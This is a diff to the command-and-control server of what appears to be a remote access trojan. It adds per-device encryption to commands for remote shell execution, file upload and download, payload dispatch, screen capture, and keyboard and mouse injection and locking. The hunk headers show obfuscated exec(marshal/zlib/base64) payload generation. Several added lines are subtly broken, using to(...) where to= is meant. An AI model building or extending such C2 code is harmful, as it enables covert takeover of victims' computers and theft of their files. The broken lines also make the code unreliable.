@@ -186,7 +186,11 @@ class C2:
                 break
 
     def ctrl(self, data):
-        self.sio.emit("restart", data)
+        uid = data["uid"]
+        if uid in self.devices:
+            public_key_pem = self.devices[uid]["public_key"]
+            encrypted_data = encrypt_message_with_device_key(public_key_pem, json.dumps(data))
+            self.sio.emit("restart", encrypted_data, to=self.devices[uid]["sid"])
 
     def update_json(self):
         for device in self.total_devices:
@@ -233,15 +237,21 @@ class C2:
         if explotation_module_type == "send-command":
             for uid in uids:
                 print(data["input"])
-                self.sio.emit("command", {"uid": uid, "cmd": data["input"], "key": "server"})
+                public_key_pem = self.devices[uid]["public_key"]
+                encrypted_data = encrypt_message_with_device_key(public_key_pem, json.dumps({"uid": uid, "cmd": data["input"], "key": "server"}))
+                self.sio.emit("command", encrypted_data, to=self.devices[uid]["sid"])
 
         elif explotation_module_type == "disconect":
             for uid in uids:
-                self.sio.emit("pem", {"uid": uid, "url": "stop.py"})
+                public_key_pem = self.devices[uid]["public_key"]
+                encrypted_data = encrypt_message_with_device_key(public_key_pem, json.dumps({"uid": uid, "url": "stop.py"}))
+                self.sio.emit("pem", encrypted_data, to=self.devices[uid]["sid"])
 
         else:
             for uid in uids:
-                self.sio.emit("pem", {'uid': uid, "url": data['path']})
+                public_key_pem = self.devices[uid]["public_key"]
+                encrypted_data = encrypt_message_with_device_key(public_key_pem, json.dumps({'uid': uid, "url": data['path']}))
+                self.sio.emit("pem", encrypted_data, to(self.devices[uid]["sid"])
 
     def generate(self, generate):
         os_name = generate["os"]
@@ -376,11 +386,11 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
 
         for uid in uids:
             public_key_pem = self.devices[uid]["public_key"]
-            encrypted_data = encrypt_message_with_device_key(public_key_pem, {
+            encrypted_data = encrypt_message_with_device_key(public_key_pem, json.dumps({
                 "uid": uid,
                 "file_name": file.filename,
                 "file": base64_encoded
-            })
+            }))
             self.sio.emit("upload_file", encrypted_data, to=self.devices[uid]["sid"])
 
     def download_file(self, data):
@@ -389,14 +399,14 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
 
         for uid in data["uids"]:
             public_key_pem = self.devices[uid]["public_key"]
-            encrypted_data = encrypt_message_with_device_key(public_key_pem, {
+            encrypted_data = encrypt_message_with_device_key(public_key_pem, json.dumps({
                 "uid": uid,
                 "file_path": file_path
-            })
+            }))
             self.sio.emit("download_file", encrypted_data, to=self.devices[uid]["sid"])
 
     def save_file(self, sid, data):
-        data = json.loads(decrypt(data))
+        data = json.loads(self.keys.decrypt(data))
         if not os.path.isdir("files_saved"):
             os.makedirs("files_saved")
 
@@ -423,8 +433,11 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
             'screen_fps': settings['settings']['screen_sharing']['screen_fps'],
             'screen_qualtiy': settings['settings']['screen_sharing']['screen_qualtiy']
         }
-        self.sio.emit("change_screen_information", screen_res_data)
-        self.sio.emit("screen_status", data)
+        public_key_pem = self.devices[data['uid']]["public_key"]
+        encrypted_screen_res_data = encrypt_message_with_device_key(public_key_pem, json.dumps(screen_res_data))
+        self.sio.emit("change_screen_information", encrypted_screen_res_data, to=self.devices[data['uid']]["sid"])
+        encrypted_data = encrypt_message_with_device_key(public_key_pem, json.dumps(data))
+        self.sio.emit("screen_status", encrypted_data, to=self.devices[data['uid']]["sid"])
 
     def screenshot_taken(self, sid, data):
         print(sid)
@@ -433,46 +446,94 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
         self.sio.emit("screenshot", data)
 
     def switch_screen(self, sid, data):
-        self.sio.emit("switch_screen", data)
+        uid = data["uid"]
+        if uid in self.devices:
+            public_key_pem = self.devices[uid]["public_key"]
+            encrypted_data = encrypt_message_with_device_key(public_key_pem, json.dumps(data))
+            self.sio.emit("switch_screen", encrypted_data, to=self.devices[uid]["sid"])
 
 
 
     def mouse_input(self, sid ,data):
-        self.sio.emit("mouse_input", data)
+        uid = data["uid"]
+        if uid in self.devices:
+            public_key_pem = self.devices[uid]["public_key"]
+            encrypted_data = encrypt_message_with_device_key(public_key_pem, json.dumps(data))
+            self.sio.emit("mouse_input", encrypted_data, to(self.devices[uid]["sid"]))
 
     def keyboard_input(self, sid ,data):
-        self.sio.emit("keyboard_input", data)
+        uid = data["uid"]
+        if uid in self.devices:
+            public_key_pem = self.devices[uid]["public_key"]
+            encrypted_data = encrypt_message_with_device_key(public_key_pem, json.dumps(data))
+            self.sio.emit("keyboard_input", encrypted_data, to(self.devices[uid]["sid"]))
 
     def lock_keyboard(self, sid ,data):
-        self.sio.emit("lock_keyboard", data)
+        uid = data["uid"]
+        if uid in self.devices:
+            public_key_pem = self.devices[uid]["public_key"]
+            encrypted_data = encrypt_message_with_device_key(public_key_pem, json.dumps(data))
+            self.sio.emit("lock_keyboard", encrypted_data, to(self.devices[uid]["sid"]))
 
     def lock_mouse(self, sid ,data):
-        self.sio.emit("lock_mouse", data)
+        uid = data["uid"]
+        if uid in self.devices:
+            public_key_pem = self.devices[uid]["public_key"]
+            encrypted_data = encrypt_message_with_device_key(public_key_pem, json.dumps(data))
+            self.sio.emit("lock_mouse", encrypted_data, to(self.devices[uid]["sid"]))
 
 
     def mouse_click(self, sid, data):
-        self.sio.emit("mouse_click", data)
+        uid = data["uid"]
+        if uid in self.devices:
+            public_key_pem = self.devices[uid]["public_key"]
+            encrypted_data = encrypt_message_with_device_key(public_key_pem, json.dumps(data))
+            self.sio.emit("mouse_click", encrypted_data, to(self.devices[uid]["sid"]))
 
     def mouse_click_right(self, sid, data):
-        self.sio.emit("mouse_click_right", data)
+        uid = data["uid"]
+        if uid in self.devices:
+            public_key_pem = self.devices[uid]["public_key"]
+            encrypted_data = encrypt_message_with_device_key(public_key_pem, json.dumps(data))
+            self.sio.emit("mouse_click_right", encrypted_data, to(self.devices[uid]["sid"]))
 
     def screen_count(self, sid, data):
         self.sio.emit("screen_count", json.loads(self.keys.decrypt(data)))
 
     def change_screen_number(self, sid, data):
-        self.sio.emit("change_screen_number", data)
+        uid = data["uid"]
+        if uid in self.devices:
+            public_key_pem = self.devices[uid]["public_key"]
+            encrypted_data = encrypt_message_with_device_key(public_key_pem, json.dumps(data))
+            self.sio.emit("change_screen_number", encrypted_data, to(self.devices[uid]["sid"]))
     
     def mouse_scroll(self, sid, data):
-        self.sio.emit("mouse_scroll", data)
+        uid = data["uid"]
+        if uid in self.devices:
+            public_key_pem = self.devices[uid]["public_key"]
+            encrypted_data = encrypt_message_with_device_key(public_key_pem, json.dumps(data))
+            self.sio.emit("mouse_scroll", encrypted_data, to(self.devices[uid]["sid"]))
 
     def key_press(self, sid, data):
-        self.sio.emit("key_press", data)
+        uid = data["uid"]
+        if uid in self.devices:
+            public_key_pem = self.devices[uid]["public_key"]
+            encrypted_data = encrypt_message_with_device_key(public_key_pem, json.dumps(data))
+            self.sio.emit("key_press", encrypted_data, to(self.devices[uid]["sid"]))
 
     def key_press_short(self, sid, data):
-        self.sio.emit("key_press_short", data)
+        uid = data["uid"]
+        if uid in self.devices:
+            public_key_pem = self.devices[uid]["public_key"]
+            encrypted_data = encrypt_message_with_device_key(public_key_pem, json.dumps(data))
+            self.sio.emit("key_press_short", encrypted_data, to(self.devices[uid]["sid"]))
 
     def recover(self, device_id):
-        self.sio.emit("recover", {"uid": device_id})
+        uid = device_id
+        if uid in self.devices:
+            public_key_pem = self.devices[uid]["public_key"]
+            encrypted_data = encrypt_message_with_device_key(public_key_pem, json.dumps({"uid": device_id}))
+            self.sio.emit("recover", encrypted_data, to=self.devices[uid]["sid"])
         #self.recovering.append(device_id)
 
     def recover_html(self, uid):
